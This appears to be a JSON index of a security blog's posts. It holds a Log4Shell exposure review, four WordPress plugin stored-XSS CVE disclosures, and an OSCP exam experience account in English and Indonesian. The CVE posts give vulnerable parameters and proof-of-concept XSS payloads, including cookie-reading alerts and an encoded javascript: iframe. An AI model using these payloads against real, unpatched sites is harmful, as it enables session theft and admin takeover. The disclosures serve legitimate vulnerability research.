    "date": "2021-12-13 20:00:19 +0700",
    "content": "Introduction  In late 2021 I revisited one of our Java web applications to validate exposure to Log4Shell. My goal was pragmatic: verify if any user-controlled input was reaching Log4j without strict formatting or filters, and confirm whether JNDI lookups were still enabled at runtime. I approached the review as a short, repeatable exercise the dev team could replicate quickly across services.    Summary of the Finding  The application’s request metadata—specifically HTTP headers and certain form fields—was logged verbatim by Log4j 2.14.1. Because JNDI lookups were enabled in that version, a crafted string using the ${jndi:…} pattern was evaluated during logging. Under default/legacy settings this opened a path to remote lookups and, in unsafe environments, code execution. The risk hinged on two factors: (1) untrusted data reaching the logger, and (2) a reachable naming endpoint (e.g., LDAP/HTTP) that the host could contact.    Reproduction steps (tested on local instance)    Performed only on a local test instance for verification and learning. For information and setup, let’s navigate to my github repository Spring Boot Log4j - CVE-2021-44228   Links:    Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package   PSA: Log4Shell and the current state of JNDI injection   Log4Shell sample vulnerable application (CVE-2021-44228)   JNDIExploit Update (Dec 13th): The JNDIExploit repository has been removed from GitHub  "
  },
  
  {
    "title": "WordPress Advanced Ticket System < 1.0.64 — Authenticated Stored XSS in Ticket Metadata",
    "url": "/posts/cve-2021-24623/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2021-10-01 20:00:19 +0700",
    "content": "Introduction  While reviewing help-desk and ticketing plugins for WordPress, I focused on how user-supplied ticket metadata is validated before being stored and rendered. These flows often accept multiple categorical fields that feel “safe” (type, priority, status), but if they are saved and later echoed without proper escaping, they become reliable vectors for stored cross-site scripting (XSS). My goal was to trace the submission lifecycle for these fields, confirm how the values are handled server-side, and validate the impact using a controlled proof-of-concept.    Summary of the Finding  The plugin fails to adequately sanitize and escape several ticket form fields before persisting and rendering them. As a result, an authenticated user with ticket-creation capability can inject script payloads into metadata fields (e.g., ticket type, priority, status). When the ticket is later viewed via its permalink, the payload executes in the viewer’s browser, constituting an authenticated stored XSS condition in versions prior to 1.0.64.    Reproduction steps (tested on local instance)    Performed only on a local test instance for verification and learning.           From the WordPress dashboard, go to Tickets → Add New, complete the title, content, and the metadata fields (Ticket type, Ticket priority, Ticket status), then save.           Intercept the resulting request in Burp Suite and locate the parameters wats_select_ticket_type, wats_select_ticket_priority, and wats_select_ticket_status. These fields are susceptible to stored XSS and can be populated with payloads such as      test\"&gt;&lt;script&gt;alert('test')&lt;/script&gt;  or  test\"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;  Forward the modified request. To confirm execution, open the ticket’s permalink; the injected script will run when the page renders.  All of the parameters on the “Editing Form” are vulnerable.To trigger the XSS payload, refresh the “Editing Form” page.  Timelines    Publicly Published : 2021-08-16   Added : 2021-08-16   Last Updated : 2021-08-16   Links:    WordPress Advanced Ticket System &lt; 1.0.64 - Authenticated Stored Cross-Site Scripting (XSS)   CVE-2021-24623  "
  },
  
  {
    "title": "WP Ticket (Customer Service Software & Support Ticket System) < 5.10.4 — Admin+ Stored XSS via Unsanitized List Fields (CVE-2021-24622)",
    "url": "/posts/cve-2021-24622/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2021-10-01 20:00:19 +0700",
    "content": "Introduction  I set out to review helpdesk/ticketing plugins that are frequently installed in intranets and customer portals—places where strict role boundaries exist and unfiltered_html is commonly disabled for non-superadmin roles. My focus was on how user-submitted fields are rendered back in list and admin views. WP Ticket’s workflow—end users submit tickets, staff/admins triage them—made it a good candidate to test whether output escaping was consistently applied across the interface. During this review I identified a stored cross-site scripting (XSS) issue that could be triggered by high-privilege users (Admin+) even in environments where unfiltered_html is disallowed, matching CVE-2021-24622.    Summary of the Finding  Versions of WP Ticket prior to 5.10.4 do not properly sanitize and escape certain form fields before outputting them in the List view. As a result, HTML/JavaScript embedded in those fields is stored and later executed in an administrator’s browser when they load the affected admin list page. Because the vulnerable sink lives in an Admin+ context, the practical exploit path is “stored XSS that fires in the admin UI,” enabling actions such as privilege escalation, CSRF bypass via DOM-driven requests, or planting long-lived admin backdoors. The issue is documented as CVE-2021-24622 and was fixed in 5.10.4.    Reproduction steps (tested on local instance)    Performed only on a local test instance for verification and learning.           Navigate to WP Ticket &gt; Forms &gt; edit layout of “Open a Ticket” or “Search Tickets” &gt; on “Editing Form” Setting menu.           Select a form field and you can edit the “Label” with a cross-site scripting (XSS) payload such as     v &lt; 5.10.3 - \"&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;  v &lt;= 5.10.3 - \" style=animation-name:rotation onanimationstart=alert(/XSS/)//           All of the parameters on the “Editing Form” are vulnerable.To trigger the XSS payload, refresh the “Editing Form” page.  Timelines    Publicly Published : 2021-09-20   Added : 2021-09-20   Last Updated : 2021-09-20   Links:    WP Ticket &lt; 5.10.4 - Admin+ Stored Cross-Site Scripting   CVE-2021-24622  "
  },
  
  {
    "title": "WP Courses LMS < 2.0.44 — Authenticated Stored XSS via 'Video Embed Code'",
    "url": "/posts/cve-2021-24621/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2021-10-01 20:00:19 +0700",
    "content": "Introduction  While reviewing WordPress learning-management plugins, I focused on inputs that render inside lesson or course pages—especially fields intended for HTML or embeds. These areas often receive elevated trust from developers but still require strict server-side sanitization and output escaping. During this review, I looked at WP Courses LMS and examined how its “Video Embed Code (iframe)” field is processed and displayed to learners. My aim was to determine whether the plugin correctly sanitizes embed input and whether the resulting output is safely escaped when rendered on the front end. The behavior I observed indicated that crafted markup could persist to the database and execute when a visitor opens the affected course page.    Summary of the Finding  The Video Embed Code field in WP Courses LMS (versions prior to 2.0.44) did not adequately sanitize user-supplied HTML, allowing a high-privilege user to store malicious JavaScript that executes whenever the corresponding course page is viewed. This constitutes an authenticated stored XSS vulnerability. Notably, exploitation was possible even if the WordPress role lacked the unfiltered_html capability, because the plugin’s own handling failed to neutralize dangerous payloads at save or render time. The issue is documented publicly and fixed in later releases.    Reproduction steps (tested on local instance)    Performed only on a local test instance for verification and learning.           From the WordPress dashboard, I navigated to: WP Courses → Courses → Add New → Post settings → “Video Embed Code (iframe)”. This field accepts HTML intended to embed a video player inside a course page           I prepared a simple proof-of-concept using an iframe with a javascript: URL to confirm whether the input would be persisted and executed. Example payloads recorded in my notes:      &lt;iframe src=\"javascript:alert(document.cookie)\"&gt; &lt;/iframe&gt;;&lt;iframe src=\"javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29\"&gt;&lt;/iframe&gt;      I saved/updated the course containing the payload, then, click Update, and to trigger XSS payload, open URL path of course.   Visiting the public (or preview) URL of the affected course caused the browser to execute the injected script, demonstrating stored XSS. On vulnerable versions, the plugin neither sanitized the payload at save time nor escaped it at render time, allowing the markup to run in the viewer’s context.  Timelines    Publicly Published : 2021-08-16   Added : 2021-08-16   Last Updated : 2021-08-16   Links:    WP Courses LMS &lt; 2.0.44 - Authenticated Stored XSS via Video Embed Code   CVE-2021-24621  "
  },
  
  {
    "title": "Book appointment Online < 1.39 - Authenticated Stored Cross-Site Scripting (XSS)",
    "url": "/posts/cve-2021-24614/",
    "categories": "Infosec, CVE, Research",
    "tags": "cve, infosec",
    "date": "2021-10-01 20:00:19 +0700",
    "content": "Introduction  I was reviewing appointment-booking plugins to check how they render merchant-defined data back into admin/listing views. Fields like “service name,” “duration,” and “price” often look harmless, yet they’re frequently echoed across multiple templates. During this pass, I focused on the Book appointment Online plugin and traced how it prints the Service Prices field—both in the admin list and the user-facing list. My aim was simple: confirm whether user-supplied values were properly sanitized/escaped before being sent to the browser. The plugin versions prior to 1.39 did not handle this safely, which opened the door to a stored cross-site scripting (XSS) issue under authenticated contexts.    Summary of the Finding  The plugin did not sanitize or escape the “Service Prices” field before outputting it in the list view. As a result, a high-privilege authenticated user (e.g., Editor/Shop-manager-like role inside the plugin) could store HTML/JS payloads in the price value that would execute whenever the list was rendered—even when the WordPress unfiltered_html capability was disallowed. Practically, this enables session-riding within the same origin (stealing nonces, performing privileged actions, or altering plugin settings) depending on which page reflects the payload. The issue is cataloged as CVE-2021-24614, fixed in v1.39.    Reproduction steps (tested on local instance)    Performed only on a local test instance for verification and learning.           Installed a vulnerable release of the plugin in a local WordPress instance. Created two accounts: an administrator and a high-privilege non-admin user who can manage services within the plugin.           Navigated to the plugin’s Services section and confirmed that the Service Prices column is rendered in the admin list and (depending on configuration) in a front-end list.           To test for reflected/echoed content, I started with an innocuous HTML probe in the Service Prices field (e.g., 123). Seeing the tags echoed back unescaped, I escalated to a standard stored-XSS probe that survives attribute filtering in many contexts:      &lt;img src=x onerror=alert(1)&gt;      As an alternative (and sometimes more reliable in SVG-friendly contexts):   &lt;svg onload=alert(1)&gt;      Saved the service. Reloaded the Services list and browsed the corresponding page where the price is printed. The payload executed when the list rendered, and the XSS will be triggered in the Services list /wp-admin/edit.php?post_type=services, confirming a stored XSS vector tied to the price field.   Timelines    Publicly Published : 2021-08-10   Added : 2021-08-10   Last Updated : 2021-08-10   References:    Book appointment Online &lt; 1.39 - Authenticated Stored Cross-Site Scripting (XSS)   CVE-2021-24614  "
  },
  
  {
    "title": "[English] OSCP Certification Exam Experience",
    "url": "/posts/english-oscp-certification-exam-experience/",
    "categories": "Infosec, Certification",
    "tags": "infosec, certification, offsec",
    "date": "2021-08-27 20:00:19 +0700",
    "content": "   Update: Since 2022, Offensive Security (OffSec) updated the PEN-200 materials by adding Active Directory content and removing Buffer Overflow (BoF) from the exam, so some suggestions in this post are less relevant. You can read OffSec’s announcement here: https://www.offsec.com/offsec/oscp-exam-structure/    Intruduction Here is my story about passing the OSCP exam, which I hope helps anyone taking or planning to take the certification. OSCP is a widely recognized professional certification in penetration testing/red teaming and is often requested by security recruiters. Beyond hiring value, OSCP sharpens a pentester’s approach to analyzing each engagement—what to tackle first, how to enumerate ports and services, and how to assess vulnerabilities across services, web applications, and buffer overflow scenarios.  Anyone pursuing this certification should already be comfortable with Linux fundamentals—especially Kali Linux—because the OSCP course is Penetration Testing with Kali Linux (PWK). A basic understanding of computer networks, ports, the services running on those ports, and some familiarity with scripting/programming is also important.  Learning Resources Below are the study resources I used to prepare for the OSCP exam:          TJNull - NetSecFocus Trophy Room, a list of machines similar to OSCP targets—great for practice.           HackTheBox – a subscription (min. 1 month) is recommended to access retired machines.           VulnHub – you only need a strong internet connection and ample storage for VMs. You can download machines from the TJNull list.           TryHackMe – study rooms like Windows and Linux Privilege Escalation by Tib3rius/TCM, Buffer Overflow Preparation by Tib3rius, and try both free and premium CTF boxes.           Offensive Security Proving Grounds – OffSec’s own lab platform. Proving Grounds Play (free, includes some VulnHub boxes) and Proving Grounds Practice (newer, OffSec-authored machines).           IPPSec YouTube videos – walkthroughs of HTB machines that showcase enumeration methodology, avoiding rabbit holes, and privilege escalation.           HackTheBox OSCP Preparation (Rana Khalil) – clear write-ups of retired HTB boxes with easy-to-follow enumeration and escalation methods.           Udemy – helpful courses from Tib3rius/TCM on Windows and Linux privilege escalation. I used author discounts announced on Twitter/Discord—follow or join their servers to catch them.           Hack Tricks by carlos polop – an essential pentester handbook; it helped me a lot during OSCP, especially for per-port/service methodology.           Payloads All The Things (GitHub repo) – notes on enumeration, web attacks, and privilege escalation.           GTFOBins – documentation for Linux privilege escalation techniques.      You can also discuss and learn in the Offensive Security Discord and NetSecFocus Discord. Many of the lists above are commonly shared by PWK students who passed OSCP, but in my case, participating in boot2root/jeopardy CTFs also helped a lot.  Exam Preparation For the exam, make sure you are solid on enumeration techniques and privilege escalation (review until you’re confident). Also aim to reduce reliance on write-ups when working through retired HTB and OffSec PG Play boxes.  For note-taking during the exam, I recommend Obsidian because it’s lightweight and easy to use. As an alternative, Joplin is also good. Before the exam, read the OffSec OSCP Exam Guide thoroughly, prepare yourself mentally, and schedule the exam. I chose a weekend (Saturday) because I had cleared my workload.  The day before the exam, I rested completely—watched movies and some YouTube for mental prep. One hour before the exam (06:00 WIB), I woke up, prepared snacks, water, and coffee. Fifteen minutes before the start, I logged into the proctoring page and chatted with the proctor to verify my ID (ID Card/Passport—have scanned copies ready). You’ll be asked to show the room, your desk, and under the desk using your webcam. VPN and control panel details, along with exam machine IPs, will be emailed to you. You’ll then test your OS and internet connection with the provided VPN.  Communicate with the proctor and ask permission to pause the webcam if you need a restroom or rest break.  Once cleared, you can begin. Tackle the machines you find easiest first—often BoF back then—then lower-point boxes, and finally the hardest. When you face a target, start with network scanning, document all open ports and services, enumerate each thoroughly, and follow leads until you find a vulnerability. Avoid jumping to another box prematurely unless you are truly stuck.  Most vulnerabilities have documentation and public exploits on exploit-db or elsewhere. For privilege escalation, use the resources listed above. During the exam, you’re allowed to reference command lines from Hack Tricks by carlos polop, Payloads All The Things (GitHub repo), and your own notes, as well as IPPSec videos or other references.  While taking the exam, screenshot every important step in your Kali terminal and keep everything organized in your note-taking app with brief explanations. This is crucial when writing the report later.  Reporting You can use the template provided in the OffSec OSCP Exam Guide or the Offensive Security Exam Report Template in Markdown (note: I used the Markdown template). Start writing when you’re well-rested, then upload to the OffSec submission link. Make sure grammar is correct, screenshots and source code are clear, and your steps are well-documented.  After submission, wait for OffSec to announce the result on business days. In my case, the exam ended at 23:00 WIB after starting at 06:00 WIB (almost 18 hours). I rested and began writing the report at 08:00 WIB the next morning. Try not to be overly anxious—stay calm, take breaks, do something that refreshes you, and pray.  Result Announcement Results are sent by email, typically within 1–2 business days. About 1.5 days after submitting my report—on Wednesday, August 24, 2021—I received the email confirming that I passed the OSCP.   OSCP Pass Announcement  According to the latest information from Offensive Security, the badge can be accessed via Accredible.    "
  },
  
  {
    "title": "[Bahasa] Pengalaman Ujian Sertifikasi OSCP",
    "url": "/posts/bahasa-pengalaman-ujian-oscp/",
    "categories": "Infosec, Certification",
    "tags": "infosec, certification, offsec",
    "date": "2021-08-27 20:00:19 +0700",
    "content": "   Update: Semenjak tahun 2022, Offensive Security (OffSec) melakukan update terhadap materi PEN-200 dengan menambahkan materi Active Directory dan menghapus Buffer Overflow (BoF) pada exam, sehingga beberapa saran dari posting ini menjadi kurang relevan. Terkait berita tersebut bisa dibaca pada postingan OffSec berikut: https://www.offsec.com/offsec/oscp-exam-structure/   Pendahuluan Berikut cerita pengalaman saya untuk lulus ujian OSCP yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi OSCP. OSCP merupakan salah satu sertifikasi profesional di bidang penetration testing atau red team yang telah banyak diakui oleh para rekruter di perusahaan security, beberapa perusahaan mengingkan para pelamar memiliki sertifikasi OSCP agar dapat bekerja di perusahaan security tersebut. Tidak hanya itu OSCP dapat meningkatkan kualitas para pentester dalam menganalisis setiap pekerjaan yang mereka hadapi, seperti hal apa yang pertama dihadapi?, proses melakukan enumeration pada setiap port, services sampai ke setiap vulnerability yang ada pada service, web application, buffer overflow.  Setiap orang ingin mengambil sertifikasi ini harus sudah menguasai teknik dasar dari sistem operasi linux, terutama kali linux, karena sesuai dengan nama kursus dari OSCP yaitu Penetration With Kali linux (PWK), kemudian dasar dari jaringan komputer,ports, service pada port tersebut,serta harus sedikit familiar dengan dengan scripting bahasa pemrograman.  Sumber Belajar Berikut beberapa sumber belajar yang telah saya pelajari untuk menempuh ujian sertifikasi OSCP, antara lain          TJNull - NetSecFocus Trophy Room, merupakan list mesin - mesin seperti mesin OSCP, dan dapat dijadikan untuk latihan           HackTheBox - diwajibkan subcribe (mins 1 month) agar dapat mendapatkan akses mesin yang sudah retired.           VulnHub - anda hanya perlu memiliki koneksi internet yang kuat, serta media penyimpanan yang besar untuk menyimpan VM dari VulHub, Anda cukup mendownload apa yang sudah ada di TJNull list tersebut.           TryHackMe - Pelajari beberapa room seperti Windows dan Linux Privilege Escalation dari Tib3rius,TCM, Buffer Overflow Preparation dari Tib3rius, dan bermain juga beberapa mesin CTF yang free, maupun premium.           Offensive Security Proving Grounds - OffSec juga mengeluarkan sistem permainan, dan latihan dengan nama Offensive Security Proving Grounds, tersedia untuk yang free yaitu Proving Grounds Play dengan beberapa mesin yang diambil dari mesin VulnHub, kemudian Proving Ground Practice untuk mesin - mesin terbaru buatan khusus OffSec.           IPPSec YouTube videos - berisikan video writeup pada mesin - mesin HTB, anda dapat mempelajari dari IPPSec yaitu metodologi dalam melakukan proses enumeration,how to avoid a rabbit hole, sampai ke proses privilege escalation.           HackTheBox OSCP Preparation (Rana Khalil) - merupakan blog berisikan writeup dari mesin HTB yang sudah retired, anda dapat mempelajari metode dalam melakukan enumeration, sampai privilege escalation dengan penjelasan yang mudah dimengerti.           Udemy - pada udemy ada beberapa video dari tib3rius,TCM yang memberikan pengetahuan mengenai bagaimana privilege escalation di sistem operasi Windows dan Linux. Untuk ini saya mendapatkan diskon yang dapatkan dari authors masin - masing, jadi follow akun twitter atau gabung di discord channel author - author tersebut.           Hack Tricks by carlos polop - berisakan catatan penting untuk seorang pentester, dalam hal ini sangat membantu saya ketika menyelesaikan OSCP, terutama methodology setiap port maupun service.           Payloads All The Things (GitHub repo) - berisikan catatan penting mengenai teknik untuk enumeration, web attack, sampai ke privilege escalation.           GTFOBins - berisikan informasi mengenai dokumentasi untuk linux privilege escalation.      Selain itu dapat berdiskusi di group Discord Offensive Security, dan Discord NetSecFocus. Beberapa list yang disebutkan adalah umum yang sering di-sharing oleh PWK student yang lulus OSCP, namun bagi saya sendiri, mengikuti beberapa event CTF boot2root/jeopardy menjadi nilai tambah.  Exam Preparation Untuk ujian, pastikan anda sudah menguasai beberapa teknik enumeration, sampai privilege escalation (ulangi lagi jika belum terlalu menguasai), kemudian anda juga sudah tidak lagi ketergantungan dengan write-up ketika anda bermain mesin retired di HTB, dan OffSec PG Play.  Untuk aplikasi catatan selama exam saya sarankan menggunakan obsidian, dikarenakan ringan dan mudah digunakan, jika ada opsi lain saya anjurkan menggunakan joplin. Pada saat mau ujian pastikan peraturan - peraturan dari OffSec OSCP Exam Guide telah anda baca dan pahami, kemudian siapkan mental anda dan ambil jadwal exam, saya ambil pada waktu weekend (Sabtu), dikarenakan semua pekerjaan saya telah selesai.  Pada hari sebelum saya exam, saya mengambil istirahat total, menonton film, video di youtube untuk persiapan mental pada saat exam hari berikutnya. Satu jam sebelum exam (jam 06:00 WIB) saya sudah bangun mempersiapkan diri, snack, air minum dan kopi, kemudian 15 menit sebelum exam saya sudah login ke halaman proctors, kemudian chating dengan proctors untuk melakukan pengecekan kartu identitas (ID Card/KTP, Passport, sebagai catatan pastikan anda menyiapkan hasil scan softcopy ID Card, Passport anda), dan anda akan disuruh mengarahkan kamera anda untuk mengecek ruangan, meja kerja anda, dan bawah meja anda melalui kamera yang terhubung dengan laptop/komputer anda, kemudian akan dikirimkan akses vpn dan control panel,beserta alamat ip mesin exam ke email anda, kemudian akan disuruh untuk mengecek sistem operasi beserta koneksi internet dengan koneksi vpn yang telah diberikan.  Pastikan anda berkomunikasi dengan proctor dan minta izin untuk meng-pause webcam ketika ingin ke kamar kecil, istirahat.  Setelah itu anda akan dipersilahkan untuk memulai exam. Untuk exam pastikan bisa menyelesaikan mesin yang bagi anda mudah, seperti BoF, kemudian mesin dengan point kecil sampai ke point yang terbesar. Ketika anda sudah dihadapkan dengan mesin exam, pastikan anda lakukan network scanning terlebih dahulu, kemudian dokumentasikan setiap port dan service yang terlihat, kemudian anda lakukan enumeration pada setiap masing - masing port dan services tersebut, sampai anda menemukan indikasi vulnerability, dan jangan anda mencoba loncat ke mesin lain, pastikan anda selesai terlebih dahulu mesin yang sedang anda lakukan enumeration, kecuali jika anda sudah stuck.  Setiap vulnerability akan tersedia dokumentasi beserta exploitnya di exploit-db ataupun di internet/public dan untuk privilege escalation anda bisa mempelajari teknik - teknik pada sumber - sumber yang telah saya jabarkan di atas, dan anda ketika ujian anda diperbolehkan melihat command lines pada Hack Tricks by carlos polop, Payloads All The Things (GitHub repo) ataupun sumber - sumber lain anda, maupun writeup dari IPPSec YouTube videos ataupun website lain yang menjadi referensi anda.  Saat dalam ujian pastikan setiap proses pada kali linux terminal anda di-screen-shot-kan, kemudian simpan dan terdokumentasi di aplikasi note anda, berikut juga penjelasan singkat, dikarenakan hal itu sangat penting, ketika anda ingin membuat reportnya nanti.  Pengetikan Report Untuk report anda dapat menggunakan yang telah disediakn oleh OffSec OSCP Exam Guide,atau dari Offensive Security Exam Report Template in Markdown catatan: saya menggunakan report markdown tersebut. Pastikan mulai melakukan penulisan ketika anda sudah fresh dari istirahat yang cukup, kemudian mulailah melakukan pengetikan report. Setelah itu segera upload ke link yang sediakan oleh OffSec, pastikan anda telah mengoreksi grammar, screen-shot dan source code yang jelas, serta langkah - langkah yang jelas.  Untuk selanjutnya anda tinggal menunggu hasil dari OffSec yang akan diumumkan sesuai dengan hari kerja, dan dari pengalaman saya yaitu waktu exam selesai jam 23:00 WIB dan dimulai dari 06:00WIB (hampir 18 jam), kemudian istirahat dan mulai membuat report pada jam 08:00WIB di pagi hari berikutnya. Pastikan anda jangan terlalu gugup/anxiety, resah, tetap berpikir tenang, ambil istirahat &amp; coba lakukan hal yang membuat anda refresh/tenang, dan berdoa.  Pengumuman Hasil Untuk pengumuman hasil akan diumumkan melalui email dan sekitar 1-2 hari (hari kerja). Setelah menunggu sekitar 1.5 hari setelah pengiriman report, dan tepat pada rabu, 24 Agustus 2021, saya mendapatkan email dan dikabarkan lulus ujian OSCP   Pengumuman Kelulusan OSCP  Berdasarkan informasi terbaru dari Offensive Security, untuk badge dapat diakses menggunakan accredible.    "
  }
  
]

